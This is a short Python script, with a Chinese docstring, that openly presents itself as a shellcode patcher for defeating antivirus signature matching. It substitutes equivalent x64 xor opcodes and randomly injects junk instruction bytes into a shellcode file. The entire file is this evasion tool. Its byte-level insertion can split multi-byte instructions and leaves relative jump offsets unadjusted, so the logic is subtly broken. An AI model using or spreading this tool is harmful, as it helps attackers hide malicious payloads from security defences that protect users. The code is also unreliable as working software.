#!/usr/bin/env python3
"""
Shellcode Patch — 同义指令替换 + 花指令注入
破坏杀软静态特征码匹配。
"""
import sys
import random

X64_SYNONYMS = {
    b'\x48\x31\xc0': b'\x48\x33\xc0\x90',
    b'\x48\x31\xd2': b'\x48\x33\xd2\x90',
    b'\x48\x31\xc9': b'\x48\x33\xc9\x90',
    b'\x48\x31\xdb': b'\x48\x33\xdb\x90',
    b'\x48\x31\xf6': b'\x48\x33\xf6\x90',
    b'\x48\x31\xff': b'\x48\x33\xff\x90',
}

JUNK_CHUNKS = [
    b'\x90',
    b'\x90\x90',
    b'\x48\x87\xc0\x48\x87\xc0',
    b'\x48\xff\xc0\x48\xff\xc8',
    b'\x50\x58',
    b'\xEB\x00',
]


def patch_synonyms(data: bytes) -> bytes:
    for orig, repl in X64_SYNONYMS.items():
        data = data.replace(orig, repl)
    return data


def inject_junk(data: bytes, density: float = 0.02) -> bytes:
    """按 density 比例随机插入花指令。跳过 call/jmp/ret 附近。"""
    result = bytearray()
    for b in data:
        result.append(b)
        if b in (0xE8, 0xE9, 0xC3, 0xC2, 0xEB, 0xFF, 0x0F):
            continue
        if random.random() < density:
            result.extend(random.choice(JUNK_CHUNKS))
    return bytes(result)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [density=0.02]")
        sys.exit(1)
    in_file = sys.argv[1]
    density = float(sys.argv[2]) if len(sys.argv) > 2 else 0.02
    with open(in_file, 'rb') as f:
        data = f.read()
    print(f"[*] Input:  {len(data)} bytes")
    data = patch_synonyms(data)
    print(f"[*] Synonym patch: {len(data)} bytes")
    data = inject_junk(data, density)
    print(f"[*] Junk (density={density}): {len(data)} bytes")
    out_file = in_file.replace('.bin', '_patched.bin')
    with open(out_file, 'wb') as f:
        f.write(data)
    print(f"[+] {out_file}")


if __name__ == '__main__':
    main()
